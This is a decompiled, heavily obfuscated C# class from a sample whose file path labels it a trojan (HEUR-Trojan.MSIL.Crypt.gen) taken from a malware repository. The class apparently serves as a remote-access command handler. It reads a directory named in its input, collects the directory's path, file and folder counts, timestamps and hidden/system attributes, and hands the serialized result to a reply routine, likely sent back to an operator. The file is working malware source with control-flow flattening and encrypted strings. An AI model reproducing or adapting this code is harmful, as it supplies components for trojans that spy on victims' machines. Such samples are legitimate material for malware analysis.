// Decompiled with JetBrains decompiler
// Type: @Ӣ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ӣ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u00367g() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0037Yn() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ӣ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (!\u0040Ӣ.\u0040ӧ())
    {
      num1 = 3;
      goto label_5;
    }
    else
    {
      num1 = 2;
      if (!\u0040Ӣ.\u0040ӧ())
        goto label_5;
    }
label_4:
    \u0040Ӣ.\u0040Ӗ((object) this);
    goto label_7;
label_5:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_2;
        case 1:
        case 2:
          goto label_4;
        case 4:
          goto label_7;
        default:
          if (\u0040Ӣ.\u0040Ӧ())
          {
            num1 = 4;
            continue;
          }
          goto label_7;
      }
    }
label_2:
    \u0040Ӣ.\u0040ӕ();
    goto label_4;
label_7:
    try
    {
      Dictionary<string, string> dictionary1 = _param2.\u0040ӗ<Dictionary<string, string>>();
      Dictionary<string, Dictionary<string, string>> dictionary2 = new Dictionary<string, Dictionary<string, string>>()
      {
        {
          (string) \u0040Ӣ.\u0040ӗ(970),
          new Dictionary<string, string>()
        }
      };
      if (\u0040Ӣ.\u0040Ә((object) dictionary1[(string) \u0040Ӣ.\u0040ӗ(908)]))
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(dictionary1[(string) \u0040Ӣ.\u0040ӗ(908)]);
        try
        {
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(988)] = (string) \u0040Ӣ.\u0040ә(\u0040Ӣ.\u0040ӗ(1000), (object) \u0040ԝ.\u0040ܯ(\u0040ԝ.\u0040ۖ(this, directoryInfo)));
          int num2 = 6;
          if (\u0040Ӣ.\u0040Ӧ())
            goto label_14;
label_11:
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1026)] = (string) \u0040Ӣ.\u0040ӝ((object) ((IEnumerable<FileInfo>) \u0040Ӣ.\u0040ӛ((object) directoryInfo)).Count<FileInfo>().ToString(), \u0040Ӣ.\u0040ӗ(1046), (object) ((IEnumerable<DirectoryInfo>) \u0040Ӣ.\u0040Ӝ((object) directoryInfo)).Count<DirectoryInfo>().ToString(), \u0040Ӣ.\u0040ӗ(1066));
          if (!\u0040Ӣ.\u0040ӧ())
          {
            if (true)
            {
              num2 = 1;
              goto label_14;
            }
          }
          else
          {
            num2 = 5;
            goto label_14;
          }
label_13:
          Dictionary<string, string> dictionary3 = dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)];
          object key1 = \u0040Ӣ.\u0040ӗ(1086);
          DateTime dateTime1 = \u0040Ӣ.\u0040Ӟ((object) directoryInfo);
          dateTime1 = dateTime1.ToUniversalTime();
          string str1 = dateTime1.ToString((IFormatProvider) \u0040Ӣ.\u0040ӟ());
          dictionary3[(string) key1] = str1;
          goto label_17;
label_14:
          while (true)
          {
            switch (num2)
            {
              case 0:
                Dictionary<string, string> dictionary4 = dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)];
                object key2 = \u0040Ӣ.\u0040ӗ(1124);
                DateTime dateTime2 = \u0040Ӣ.\u0040ӡ((object) directoryInfo);
                dateTime2 = dateTime2.ToUniversalTime();
                string str2 = dateTime2.ToString((IFormatProvider) \u0040Ӣ.\u0040ӟ());
                dictionary4[(string) key2] = str2;
                num2 = 7;
                continue;
              case 1:
              case 2:
                goto label_13;
              case 4:
                goto label_11;
              case 6:
                dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1006)] = (string) \u0040Ӣ.\u0040Ӛ((object) directoryInfo);
                int num3 = 4;
                num2 = \u0040Ӣ.\u0040ӧ() ? num3 : num3;
                continue;
              case 7:
                goto label_19;
              default:
                goto label_17;
            }
          }
label_19:
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1144)] = \u0040Ӣ.\u0040Ӣ((object) directoryInfo).HasFlag((Enum) FileAttributes.ReadOnly) ? (string) \u0040Ӣ.\u0040ӗ(1170) : (string) \u0040Ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1176)] = \u0040Ӣ.\u0040Ӣ((object) directoryInfo).HasFlag((Enum) FileAttributes.Hidden) ? (string) \u0040Ӣ.\u0040ӗ(1170) : (string) \u0040Ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1192)] = \u0040Ӣ.\u0040Ӣ((object) directoryInfo).HasFlag((Enum) FileAttributes.System) ? (string) \u0040Ӣ.\u0040ӗ(1170) : (string) \u0040Ӣ.\u0040ӗ(1164);
          dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)][(string) \u0040Ӣ.\u0040ӗ(1208)] = \u0040Ӣ.\u0040Ӣ((object) directoryInfo).HasFlag((Enum) FileAttributes.Archive) ? (string) \u0040Ӣ.\u0040ӗ(1170) : (string) \u0040Ӣ.\u0040ӗ(1164);
          goto label_21;
label_17:
          Dictionary<string, string> dictionary5 = dictionary2[(string) \u0040Ӣ.\u0040ӗ(970)];
          object key3 = \u0040Ӣ.\u0040ӗ(1104);
          DateTime dateTime3 = \u0040Ӣ.\u0040Ӡ((object) directoryInfo);
          dateTime3 = dateTime3.ToUniversalTime();
          string str3 = dateTime3.ToString((IFormatProvider) \u0040Ӣ.\u0040ӟ());
          dictionary5[(string) key3] = str3;
          num2 = 0;
          goto label_14;
        }
        catch
        {
        }
label_21:;
      }
      \u0040Ӣ.\u0040Ӥ((object) _param1, \u0040Ӣ.\u0040ӗ(1226), \u0040Ӣ.\u0040ӣ((object) dictionary2), _param3);
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ӣ.\u0040ӥ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә(object _param0) => Directory.Exists((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0) => (object) ((FileSystemInfo) _param0).FullName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((DirectoryInfo) _param0).GetFiles();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0) => (object) ((DirectoryInfo) _param0).GetDirectories();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040Ӟ(object _param0) => ((FileSystemInfo) _param0).CreationTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӟ() => (object) CultureInfo.InvariantCulture;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040Ӡ(object _param0) => ((FileSystemInfo) _param0).LastWriteTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static DateTime \u0040ӡ(object _param0) => ((FileSystemInfo) _param0).LastAccessTime;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static FileAttributes \u0040Ӣ(object _param0) => ((FileSystemInfo) _param0).Attributes;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӣ(object _param0) => (object) _param0.\u0040ӓ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӥ(object _param0, object _param1, object _param2, \u0040Ԫ _param3) => \u0040Ԡ.\u0040Ӕ.\u0040Ӗ(_param0, _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӥ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӧ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӧ() => false;
}
